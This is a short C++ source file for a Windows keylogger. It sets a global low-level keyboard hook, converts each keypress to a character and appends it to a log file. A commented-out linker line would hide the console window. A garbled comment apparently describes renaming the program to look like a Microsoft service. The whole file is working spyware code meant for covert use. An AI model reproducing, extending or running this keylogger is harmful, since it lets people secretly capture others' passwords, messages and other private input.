#define _WIN32_WINNT 0x0400
//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")		//���ؿ���̨����	
#include <windows.h>
#include <Winuser.h>
#include <string>
#include <fstream>
#include <iostream>
#include <stdlib.h>
using namespace std;

DWORD processid = 0;
HHOOK hook = 0;
MSG msg;
ofstream of;
string passage;
char r;

void openfile();
void closefile();

char translate(int vkCode, int scanCode) {		//������Ҫ��¼�ļ����������(δ�Ż�)
	char c;

	if (48 <= vkCode && vkCode <= 57)
		c = '0' + vkCode - 48;
	else if (65 <= vkCode && vkCode <= 90)
		c = 'a' + vkCode - 65;

	else if (vkCode == 8)
		c = 'X';
	else if (vkCode == 9)
		c = 'T';
	else if (vkCode == 13)
		c = '\n';
	else if (vkCode == 20)
		c = 'C';
	else if (vkCode == 32)
		c = ' ';
	else if (vkCode == 37)
		c = '<';
	else if (vkCode == 39)
		c = '>';
	else if (vkCode == 160 || vkCode == 161)
		c = 'S';
	else if (vkCode == 162 || vkCode == 163)
		c = '^';
	else if (vkCode == 164 || vkCode == 165)
		c = 'A';
	else if (vkCode == 186)
		c = ';';
	else if (vkCode == 187)
		c = '+';
	else if (vkCode == 188)
		c = ',';
	else if (vkCode == 189)
		c = '-';
	else if (vkCode == 190)
		c = '.';
	else if (vkCode == 191)
		c = '/';
	else if (vkCode == 219)
		c = '[';
	else if (vkCode == 220)
		c = '|';
	else if (vkCode == 221)
		c = ']';
	else if (vkCode == 222)
		c = '\'';
	else
		c = '\0';
	return c;
}


LRESULT CALLBACK hookproc(int code, WPARAM wparam, LPARAM lparam) {	//�ص����̽����ַ�������
	bool flag = false;
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lparam; //��ûص�������
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
		flag = true;
	if (flag) {
		cout << translate(p->vkCode, p->scanCode);
		openfile();
		of << translate(p->vkCode, p->scanCode);
		closefile();
	}
	return CallNextHookEx(hook, code, wparam, lparam);
}

void messageloop() {	//��Ϣѭ�������ϴ�����Ϣ
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	};
}

void sethook() {	//��������
	processid = GetCurrentThreadId();
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, &hookproc, GetModuleHandle(NULL), 0);
	if (hook == NULL)
		exit(0);
}

void openfile() {
	of.open("log.txt", ios::app);
	if (!of)
		exit(0);
}

void closefile() {
	of.close();
}


int main() {	//��������Ϊ"Microsoft Service.exe"����αװ
	sethook();
	messageloop();
	UnhookWindowsHookEx(hook);
	return 0;
};